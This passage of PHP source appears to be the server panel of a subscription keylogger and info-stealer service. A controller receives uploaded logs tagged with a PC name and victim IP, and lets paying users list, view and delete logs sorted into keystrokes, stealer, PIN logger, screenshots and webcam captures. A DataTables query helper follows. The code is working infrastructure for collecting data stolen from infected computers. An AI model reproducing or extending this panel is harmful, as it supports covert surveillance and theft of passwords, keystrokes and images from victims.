		$this->form_validation->set_rules('pcname', 'PC name', 'required|trim');
		$this->form_validation->set_rules('log', 'Log', 'required|trim');

		if ($this->form_validation->run()) {

			// Get the UID of the given key.
			$uid = trim($this->manage->getUIDfromKey($this->input->post('key')));

			// Unique key function.
			function uniquelogKey($length = 32) {
    			$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    			$randomString = '';
    			for ($i = 0; $i < $length; $i++) {
        			$randomString .= $characters[rand(0, strlen($characters) - 1)];
    			}
    			return $randomString;
			}

			// Add perm log.
			$this->manage->addpermLog($uid, date('d-M-Y'));

			// Add the log.
			if ($this->manage->addLog($uid, uniquelogKey(), $this->input->post('key'), $this->input->post('type'), $this->input->post('pcname'), $this->input->ip_address(), $this->input->post('log'), date('d-M-Y'), date('d-M-Y h:i:s'))) {
				die('ok');
			}

		}

	}

	function delete($key)
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Trim the ID.
		$key = trim($key);
		// Check if the given ID exists.
		if (!$this->manage->logExists($key)) {
			redirect('logs', 'refresh');
			die();
		}
		// Check if the user owns the log.
		if (!$this->manage->ownsLog($key, $data['uid'])) {
			redirect('logs', 'refresh');
			die();
		}
		// Delete log.
		if ($this->manage->deleteLog($key)) {
			redirect($_SERVER['HTTP_REFERER'], 'refresh');
			die();
		}
			
	}

	function view($key)
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Trim the ID.
		$key = trim($key);
		// Check if the given ID exists.
		if (!$this->manage->logExists($key)) {
			redirect('logs', 'refresh');
			die();
		}
		// Check if the user owns the log.
		if (!$this->manage->ownsLog($key, $data['uid'])) {
			redirect('logs', 'refresh');
			die();
		}
		// Get log.
		$logs = $this->manage->getLog($key);
		foreach ($logs as $log) {
			$data['pcname'] = $log->pcname;
			$data['ip'] = $log->ip;
			$data['time'] = $log->time;
			$data['log'] = $log->log;
			$data['key'] = $log->unique_key;
			$data['type'] = $log->type;
		}
		// Load the index view and pass the $data array.
		$this->load->view('view', $data);	
	}

	function checkKey($key)
	{
		// Trim the key.
		$key = trim($key);
		if ($this->manage->validKey($key)) {
			// Key is correct.
			return true;
		} else {
			// Key is invalid.
			return false;
		}
	}

	function logout()
	{
		if ($this->session->userdata('logged_in')) {
			$this->session->userdata = array();
            $this->session->sess_destroy();
            redirect('login', 'refresh');
            die('Forbidden.');
		}
		$this->load->view('logout', $data);
	}
	function getstrokes() {
		$this->getlogs_ajax(1);
	}
	function getstealer() {
		$this->getlogs_ajax(2);
	}
	function getpinlogger() {
		$this->getlogs_ajax(3);
	}
	function getscreenshots() {
		$this->getlogs_ajax(4);
	}
	function getwebcam() {
		$this->getlogs_ajax(5);
	}
	function getlogs_ajax($num) {
		$columns = array(
	        array('db' => 'pcname', 
	              'dt' => 0,
	              'formatter' => function ($d, $row) {
	                return $this->security->xss_clean($d);
	              }
	        ),
	        array('db' => 'time', 
	              'dt' => 1,
	              'formatter' => function ($d, $row) {
	                return $this->security->xss_clean($d);
	              }
	        ),
	        array('db' => 'unique_key', 
	              'dt' => 2,
	              'formatter' => function ($d, $row) {
	                $contents = '<a href="view/' . $this->security->xss_clean($d) . '">View Log</a> | <a href="delete/' . $this->security->xss_clean($d) . '">Delete</a>';
	                return $contents;
	              }
	        )
    	);

	    $table = 'logs';
	    $primaryKey = 'id';

	    $sql_details = array(
	        'user' => 'username',
	        'pass' => 'password',
	        'db'   => 'dbname',
	        'host' => 'localhost'
	    );
	    //echo json_encode(SSP::simple($_GET, $sql_details, $table, $primaryKey, $columns));
	    $userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
	    echo json_encode(SSPCustom::simpleCustom($_GET, $sql_details, $table, $primaryKey, $columns, "type=" . $num . " AND uid=" . $data['uid']));
	}
}

class SSP {
	/**
	 * Create the data output array for the DataTables rows
	 *
	 *  @param  array $columns Column information array
	 *  @param  array $data    Data from the SQL get
	 *  @return array          Formatted data in a row based format
	 */
	static function data_output ( $columns, $data )
	{
		$out = array();

		for ( $i=0, $ien=count($data) ; $i<$ien ; $i++ ) {
			$row = array();

			for ( $j=0, $jen=count($columns) ; $j<$jen ; $j++ ) {
				$column = $columns[$j];

				// Is there a formatter?
				if ( isset( $column['formatter'] ) ) {
					$row[ $column['dt'] ] = $column['formatter']( $data[$i][ $column['db'] ], $data[$i] );
				}
				else {
					$row[ $column['dt'] ] = $data[$i][ $columns[$j]['db'] ];
				}
			}

			$out[] = $row;
		}

		return $out;
	}


	/**
	 * Database connection
	 *
	 * Obtain an PHP PDO connection from a connection details array
	 *
	 *  @param  array $conn SQL connection details. The array should have
	 *    the following properties
	 *     * host - host name
	 *     * db   - database name
	 *     * user - user name
	 *     * pass - user password
	 *  @return resource PDO connection
	 */
	static function db ( $conn )
	{
		if ( is_array( $conn ) ) {
			return self::sql_connect( $conn );
		}

		return $conn;
	}


	/**
	 * Paging
	 *
	 * Construct the LIMIT clause for server-side processing SQL query
	 *
	 *  @param  array $request Data sent to server by DataTables
	 *  @param  array $columns Column information array
	 *  @return string SQL limit clause
	 */
	static function limit ( $request, $columns )
	{
		$limit = '';

		if ( isset($request['start']) && $request['length'] != -1 ) {
			$limit = "LIMIT ".intval($request['start']).", ".intval($request['length']);
		}

		return $limit;
	}


	/**
	 * Ordering
	 *
	 * Construct the ORDER BY clause for server-side processing SQL query
	 *
	 *  @param  array $request Data sent to server by DataTables
	 *  @param  array $columns Column information array
	 *  @return string SQL order by clause
	 */
	static function order ( $request, $columns )
	{
		$order = '';

		if ( isset($request['order']) && count($request['order']) ) {
			$orderBy = array();
			$dtColumns = self::pluck( $columns, 'dt' );

			for ( $i=0, $ien=count($request['order']) ; $i<$ien ; $i++ ) {
				// Convert the column index into the column data property
				$columnIdx = intval($request['order'][$i]['column']);
				$requestColumn = $request['columns'][$columnIdx];

				$columnIdx = array_search( $requestColumn['data'], $dtColumns );
				$column = $columns[ $columnIdx ];

				if ( $requestColumn['orderable'] == 'true' ) {
					$dir = $request['order'][$i]['dir'] === 'asc' ?
						'ASC' :
						'DESC';

					$orderBy[] = '`'.$column['db'].'` '.$dir;
				}
			}

			$order = 'ORDER BY '.implode(', ', $orderBy);
		}

		return $order;
	}


	/**
	 * Searching / Filtering
	 *
	 * Construct the WHERE clause for server-side processing SQL query.
	 *
	 * NOTE this does not match the built-in DataTables filtering which does it
	 * word by word on any field. It's possible to do here performance on large
	 * databases would be very poor
	 *
	 *  @param  array $request Data sent to server by DataTables
	 *  @param  array $columns Column information array
	 *  @param  array $bindings Array of values for PDO bindings, used in the
	 *    sql_exec() function
	 *  @return string SQL where clause
	 */
	static function filter ( $request, $columns, &$bindings )
	{
		$globalSearch = array();
		$columnSearch = array();
		$dtColumns = self::pluck( $columns, 'dt' );

		if ( isset($request['search']) && $request['search']['value'] != '' ) {
			$str = $request['search']['value'];

			for ( $i=0, $ien=count($request['columns']) ; $i<$ien ; $i++ ) {
				$requestColumn = $request['columns'][$i];
				$columnIdx = array_search( $requestColumn['data'], $dtColumns );
				$column = $columns[ $columnIdx ];

				if ( $requestColumn['searchable'] == 'true' ) {
					$binding = self::bind( $bindings, '%'.$str.'%', PDO::PARAM_STR );
					$globalSearch[] = "`".$column['db']."` LIKE ".$binding;
				}
			}
		}

		// Individual column filtering
		if ( isset( $request['columns'] ) ) {
			for ( $i=0, $ien=count($request['columns']) ; $i<$ien ; $i++ ) {
				$requestColumn = $request['columns'][$i];
				$columnIdx = array_search( $requestColumn['data'], $dtColumns );
				$column = $columns[ $columnIdx ];

				$str = $requestColumn['search']['value'];

				if ( $requestColumn['searchable'] == 'true' &&
				 $str != '' ) {
					$binding = self::bind( $bindings, '%'.$str.'%', PDO::PARAM_STR );
					$columnSearch[] = "`".$column['db']."` LIKE ".$binding;
				}
			}
		}

		// Combine the filters into a single string
		$where = '';

		if ( count( $globalSearch ) ) {
			$where = '('.implode(' OR ', $globalSearch).')';
		}

		if ( count( $columnSearch ) ) {
			$where = $where === '' ?
				implode(' AND ', $columnSearch) :
				$where .' AND '. implode(' AND ', $columnSearch);
		}

		if ( $where !== '' ) {
			$where = 'WHERE '.$where;
		}

		return $where;
	}


	/**
	 * Perform the SQL queries needed for an server-side processing requested,
	 * utilising the helper functions of this class, limit(), order() and
	 * filter() among others. The returned array is ready to be encoded as JSON
	 * in response to an SSP request, or can be modified if needed before
	 * sending back to the client.
	 *
	 *  @param  array $request Data sent to server by DataTables
	 *  @param  array|PDO $conn PDO connection resource or connection parameters array
	 *  @param  string $table SQL table to query
	 *  @param  string $primaryKey Primary key of the table
	 *  @param  array $columns Column information array
	 *  @return array          Server-side processing response array
	 */
	static function simple ( $request, $conn, $table, $primaryKey, $columns )
	{
		$bindings = array();
		$db = self::db( $conn );

		// Build the SQL query string from the request
		$limit = self::limit( $request, $columns );
		$order = self::order( $request, $columns );
		$where = self::filter( $request, $columns, $bindings );

		// Main query to actually get the data
		$data = self::sql_exec( $db, $bindings,
			"SELECT SQL_CALC_FOUND_ROWS `".implode("`, `", self::pluck($columns, 'db'))."`
			 FROM `$table`
			 $where
			 $order
			 $limit"
		);

		// Data set length after filtering
		$resFilterLength = self::sql_exec( $db,
			"SELECT FOUND_ROWS()"
		);
		$recordsFiltered = $resFilterLength[0][0];

		// Total data set length
		$resTotalLength = self::sql_exec( $db,
			"SELECT COUNT(`{$primaryKey}`)
			 FROM   `$table`"
		);
		$recordsTotal = $resTotalLength[0][0];


		/*
		 * Output
		 */
		return array(
			"draw"            => isset ( $request['draw'] ) ?
				intval( $request['draw'] ) :
				0,
			"recordsTotal"    => intval( $recordsTotal ),
			"recordsFiltered" => intval( $recordsFiltered ),
			"data"            => self::data_output( $columns, $data )
		);
	}


	/**
	 * The difference between this method and the `simple` one, is that you can
	 * apply additional `where` conditions to the SQL queries. These can be in
	 * one of two forms:
	 *
	 * * 'Result condition' - This is applied to the result set, but not the
	 *   overall paging information query - i.e. it will not effect the number
	 *   of records that a user sees they can have access to. This should be
	 *   used when you want apply a filtering condition that the user has sent.
	 * * 'All condition' - This is applied to all queries that are made and
	 *   reduces the number of records that the user can access. This should be
	 *   used in conditions where you don't want the user to ever have access to
	 *   particular records (for example, restricting by a login id).
	 *
	 *  @param  array $request Data sent to server by DataTables
	 *  @param  array|PDO $conn PDO connection resource or connection parameters array
	 *  @param  string $table SQL table to query
	 *  @param  string $primaryKey Primary key of the table
	 *  @param  array $columns Column information array
	 *  @param  string $whereResult WHERE condition to apply to the result set
	 *  @param  string $whereAll WHERE condition to apply to all queries
	 *  @return array          Server-side processing response array
	 */
	static function complex ( $request, $conn, $table, $primaryKey, $columns, $whereResult=null, $whereAll=null )
	{
		$bindings = array();
		$db = self::db( $conn );
		$localWhereResult = array();
		$localWhereAll = array();
		$whereAllSql = '';

		// Build the SQL query string from the request
		$limit = self::limit( $request, $columns );
		$order = self::order( $request, $columns );
		$where = self::filter( $request, $columns, $bindings );

		$whereResult = self::_flatten( $whereResult );
		$whereAll = self::_flatten( $whereAll );

		if ( $whereResult ) {
			$where = $where ?
				$where .' AND '.$whereResult :
				'WHERE '.$whereResult;
		}

		if ( $whereAll ) {
			$where = $where ?
				$where .' AND '.$whereAll :
				'WHERE '.$whereAll;

			$whereAllSql = 'WHERE '.$whereAll;
		}

		// Main query to actually get the data
		$data = self::sql_exec( $db, $bindings,
			"SELECT SQL_CALC_FOUND_ROWS `".implode("`, `", self::pluck($columns, 'db'))."`
			 FROM `$table`
			 $where
			 $order
			 $limit"
		);

		// Data set length after filtering
		$resFilterLength = self::sql_exec( $db,
			"SELECT FOUND_ROWS()"
		);
		$recordsFiltered = $resFilterLength[0][0];

		// Total data set length
		$resTotalLength = self::sql_exec( $db, $bindings,
			"SELECT COUNT(`{$primaryKey}`)
			 FROM   `$table` ".
			$whereAllSql
		);
		$recordsTotal = $resTotalLength[0][0];

		/*
		 * Output
		 */
		return array(
			"draw"            => isset ( $request['draw'] ) ?
				intval( $request['draw'] ) :
				0,
			"recordsTotal"    => intval( $recordsTotal ),
			"recordsFiltered" => intval( $recordsFiltered ),
			"data"            => self::data_output( $columns, $data )
		);
	}


	/**
	 * Connect to the database
	 *
	 * @param  array $sql_details SQL server connection details array, with the
	 *   properties:
	 *     * host - host name
	 *     * db   - database name
	 *     * user - user name
	 *     * pass - user password
	 * @return resource Database connection handle
	 */
	static function sql_connect ( $sql_details )
	{
		try {
			$db = @new PDO(
				"mysql:host={$sql_details['host']};dbname={$sql_details['db']}",
				$sql_details['user'],
				$sql_details['pass'],
				array( PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION )
			);
		}
		catch (PDOException $e) {
			self::fatal(
				"An error occurred while connecting to the database. ".
				"The error reported by the server was: ".$e->getMessage()
			);
		}

		return $db;
	}


	/**
	 * Execute an SQL query on the database
	 *
	 * @param  resource $db  Database handler
	 * @param  array    $bindings Array of PDO binding values from bind() to be
	 *   used for safely escaping strings. Note that this can be given as the
	 *   SQL query string if no bindings are required.
	 * @param  string   $sql SQL query to execute.
	 * @return array         Result from the query (all rows)
	 */
	static function sql_exec ( $db, $bindings, $sql=null )
	{
		// Argument shifting
		if ( $sql === null ) {
			$sql = $bindings;
		}

		$stmt = $db->prepare( $sql );
		//echo $sql;

		// Bind parameters
		if ( is_array( $bindings ) ) {
			for ( $i=0, $ien=count($bindings) ; $i<$ien ; $i++ ) {
				$binding = $bindings[$i];
				$stmt->bindValue( $binding['key'], $binding['val'], $binding['type'] );
			}
		}

		// Execute
		try {
			$stmt->execute();
		}
		catch (PDOException $e) {
			self::fatal( "An SQL error occurred: ".$e->getMessage() );
		}

		// Return all
		return $stmt->fetchAll();
	}


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Internal methods
	 */

	/**
	 * Throw a fatal error.
	 *
	 * This writes out an error message in a JSON string which DataTables will
	 * see and show to the user in the browser.
	 *
	 * @param  string $msg Message to send to the client
	 */
	static function fatal ( $msg )
	{
		echo json_encode( array( 
			"error" => $msg
		) );

		exit(0);
	}

	/**
	 * Create a PDO binding key which can be used for escaping variables safely
	 * when executing a query with sql_exec()
	 *
	 * @param  array &$a    Array of bindings
	 * @param  *      $val  Value to bind
	 * @param  int    $type PDO field type
	 * @return string       Bound key to be used in the SQL where this parameter
	 *   would be used.
	 */
	static function bind ( &$a, $val, $type )
	{
		$key = ':binding_'.count( $a );

		$a[] = array(
			'key' => $key,
			'val' => $val,
			'type' => $type
		);

		return $key;
	}


	/**
	 * Pull a particular property from each assoc. array in a numeric array, 
	 * returning and array of the property values from each item.
	 *
	 *  @param  array  $a    Array to get data from
	 *  @param  string $prop Property to read
	 *  @return array        Array of property values
	 */
	static function pluck ( $a, $prop )
	{
		$out = array();

		for ( $i=0, $len=count($a) ; $i<$len ; $i++ ) {
			$out[] = $a[$i][$prop];
		}

		return $out;
	}


	/**
	 * Return a string from an array or a string
	 *
	 * @param  array|string $a Array to join
	 * @param  string $join Glue for the concatenation
	 * @return string Joined string
	 */
	static function _flatten ( $a, $join = ' AND ' )
	{
		if ( ! $a ) {
			return '';
		}
		else if ( $a && is_array($a) ) {
			return implode( $join, $a );
		}
		return $a;
	}
}

class SSPCustom extends SSP
{
    /**
     *  @param  array $request Data sent to server by DataTables
     *  @param  array $sql_details SQL connection details - see sql_connect()
     *  @param  string $table SQL table to query
     *  @param  string $primaryKey Primary key of the table
     *  @param  array $columns Column information array
     *  @param  string $whereCustom Custom (additional) WHERE clause
     *  @return array          Server-side processing response array
     */
    static function simpleCustom ( $request, $sql_details, $table, $primaryKey, $columns, $whereCustom = '' )
    {
        $bindings = array();
        $db = self::sql_connect( $sql_details );

        // Build the SQL query string from the request
        $limit = self::limit( $request, $columns );
        $order = self::order( $request, $columns );
        $where = self::filter( $request, $columns, $bindings );

        if ($whereCustom) {
            if ($where) {
                $where .= ' AND ' . $whereCustom;
            } else {
                $where .= 'WHERE ' . $whereCustom;
            }
        }

        // Main query to actually get the data
        $data = self::sql_exec( $db, $bindings,
            "SELECT SQL_CALC_FOUND_ROWS `".implode("`, `", self::pluck($columns, 'db'))."`
             FROM `$table`
             $where
             $order
             $limit"
        );

        // Data set length after filtering
        $resFilterLength = self::sql_exec( $db,
            "SELECT FOUND_ROWS()"
        );
        $recordsFiltered = $resFilterLength[0][0];

        // Total data set length
        $resTotalLength = self::sql_exec( $db,
            "SELECT COUNT(`{$primaryKey}`)
             FROM   `$table`
             WHERE  " . $whereCustom
        );
        $recordsTotal = $resTotalLength[0][0];


        /*
         * Output
         */
        return array(
            "draw"            => intval( $request['draw'] ),
            "recordsTotal"    => intval( $recordsTotal ),
            "recordsFiltered" => intval( $recordsFiltered ),
            "data"            => self::data_output( $columns, $data )
        );
    }
}